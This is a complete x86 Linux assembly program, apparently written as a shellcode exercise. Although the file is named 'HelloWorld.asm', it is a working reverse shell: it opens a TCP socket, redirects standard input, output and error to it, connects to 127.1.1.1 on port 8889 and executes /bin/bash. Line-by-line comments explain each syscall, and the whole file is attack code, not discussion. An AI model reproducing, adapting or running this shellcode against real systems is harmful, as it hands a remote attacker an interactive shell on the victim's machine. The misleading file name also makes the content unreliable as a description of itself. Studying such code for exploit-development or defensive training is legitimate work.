; HelloWorld.asm
; Author: TrulyOutrageous

global _start

section .text
_start:

	; First syscall is to set up the socket using sys_socketcall 0x66
	; will require sys_socketcall to call "sys_socket", by passing it 0x1 in EBX
	; ECX will be used to pass a pointer to parameters to "sys_socket"

	xor eax,eax
	xor ebx,ebx
	push eax ; this is pushing 0x0 to the stack which will be the "int protocol" param for sys_socket for a tcp socket
	inc ebx
	push ebx ; this is pushing 0x1 to the stack which will be the "int type" param for sys_socket for a SOCK_STREAM
	push byte 0x2 ; push 0x2 to stack. Will be "int domain" param for sys_socket, which is AF_INET/IPv4
	mov ecx, esp ; put the address of the stack pointer into ECX. This is a pointer for the arguments passed to sys_socket
	mov al, 0x66
	int 0x80

	; after the socket syscall the socket FD is saved in EAX. Save that value in edx to be used later
	xor edx,edx
	xchg edx, eax

	; set up the input/output for the accept connection. Will need to use dup2 to copy the 
	mov ebx,edx ; edx contains the FD for the socket. Move value EAX into EBX as EBX needs the FD value for the dup2 call
	xor ecx,ecx
	mov cl, 0x2 ; ecx is being used for the "new" FD to duplicate the socket FD in. Need it to be for 0,1,2

dup:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns dup

	; Create a connection to the specified IP address and port. This uses the "connect" of sys_socketcall, which will be 3
	; for the address, each "byte" is the octet of an IP address. So, 127.1.1.1 looks like 0x0101017f when you push it onto the stack

	; this is setting up the sockaddr needed for connect
	push 0x0101017f ; the IP address to connect to, 127.1.1.1
	push word 0xB922 ; TCP port to use, 8889
	push word 0x2 ; this is making sure the connection is AF_INET/IPv4
	mov ecx, esp ; put the stack pointer address in ECX to be used in the sys_socketcall syscall

	; now push the parameters needed for the connect syscall onto the stack
	push 0x10 ; this is the length of the address for socklen_t addrlen
	push ecx ; pointer to the sockaddr info, const struct sockaddr *addr
	push edx ; Fd for the socket
	mov ecx, esp ; after above is done, set ECX to the stack pointer address so it can all be passed to sys_socketcall
	
	mov al, 0x66
	int 0x80 ; making the syscall for sys_socketcall connect

	; after the new FD's have been created, need to set up the execve call for /bin/bash so that the new connection gets a shell
	;push the dword of nulls onto the stack
	xor eax,eax
	push eax

	;push the string of "////bin/bash" onto the stack. Extra slashes to pad out the string to a multiple of four
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f

	; ////bin/bash is on the stack, at the ESP register. So, to get the address of the location of the string into ebx, mov esp into ebx
	mov ebx, esp

	; push another null to get EDX to point to a memory address that is a dword of nulls
	push eax
	mov edx, esp

	; now for ecx, we need the address of EBX on the stack
	push ebx
	mov ecx, esp

	; make the syscall
	mov al, 0xb
	int 0x80	
